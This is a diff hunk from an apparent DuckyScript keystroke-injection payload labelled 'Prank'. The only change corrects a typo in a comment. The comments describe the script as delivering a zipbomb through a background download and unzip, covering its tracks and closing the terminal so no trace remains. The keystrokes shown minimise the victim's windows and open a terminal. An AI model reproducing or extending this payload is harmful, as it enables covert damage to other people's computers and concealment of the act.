@@ -6,7 +6,7 @@ REM Version: 1.0
 REM Category: Prank
 REM zipbomb I found and thought I would have some fun with. Covers tracks, opens a background download/unzip, and closes the terminal for no trace.
 DELAY 300
-REM Minimize all windows as that ensures launch happens smoother and when the terminal is launch everything else is relaunched for no trace of funny business.
+REM Minimize all windows as that ensures launch happens smoother and when the terminal is launched everything else is relaunched for no trace of funny business.
 WINDOWS d
 DELAY 300
 CTRL-ALT t
